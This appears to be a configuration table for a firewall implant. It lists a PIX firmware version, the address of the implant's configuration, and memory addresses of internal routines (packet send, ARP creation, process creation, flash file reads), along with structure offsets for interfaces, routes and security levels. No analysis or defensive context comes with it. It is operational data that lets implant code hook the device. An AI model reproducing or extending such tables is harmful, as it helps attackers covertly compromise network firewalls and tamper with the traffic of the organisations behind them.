; --- SECTION I ---
;
0x702            // pix version
0x4e2800              // address of implant configuration
0x0   0x008d8efc      // allocb
0x1   0x008d92e8      // freeb
0x2   0x00110318      // open
0x3   0x004804c8      // ip_put
0x4   0x0011041c      // close
0x5   0x00b8fe88      // atoip
0x6   0x00b7d5b8      // memset
0x7   0x00b99fec      // memmove
0x8   0x008d8bd8      // malloc_call_calloc
0x9   0x00b8557c      // free
0xa   0x00b7f4d4      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x00000060      // metaframe offset in block structure
0xe   0x00000074      // interface semiphore in metaframe
0xf   0x00b99e40      // rand
0x15  0x0010db9c      // process_create
0x16  0x0010ea4c      // process_suspend
0x17  0x0010f490      // process_sleep_for
0x18  0x006fa258      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x00db9a78      // cur_t
0x1b  0x04      // channel offset in interface struct
0x1c  0x0c      // PUT offset in channel struct
0x1d  0x24      // offset to dest mac in arp structure
0x1e  0x00      // offset to next hop ip in route structure
0x1f  0x10      // size of route struct
0x20  0x00483c9c      // calc_ip_cksum
0x21  0x0048545c      // arp_loopkup
0x22  0x0048422c      // set_block_hdr_mac_and_proto
0x23  0x00494e40      // get hardware interface
0x24  0x00a50df8      // get next hop
0x25  0x00a552d0      // get route
0x26  0x004823fc      // send_it
0x27  0x0048757c      // arp_create
0x28  0x00742cd4      // get_hw_iface_2
0x2a  0x44      // pointer to ethernet frame
0x2b  0x3c            // wptr structure offset
0x2c  0x24            // inIfc (incoming interface) structure offset
0x2d  0x9c      // iftype (interface type) structure offset (deprecated? may be incorrect if not)
0x2e  0x188      // offset from cur_t that contains the current context number
0x30  0x00c89b94      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x00d49314      // max number of interface cards
0x35  0x00db9258      // internal_clock
0x36  0x00741b54      // get_interface_mac
0x37  0x00000143      // offset to hardware interface number in interface struct
0x38  0x4c      // offset to ip in route structure
0x39  0x68      // offset to interface num in route structure
0x3b  0x003e8078      // ifs_read; flash file read routine -- IFS: Read:
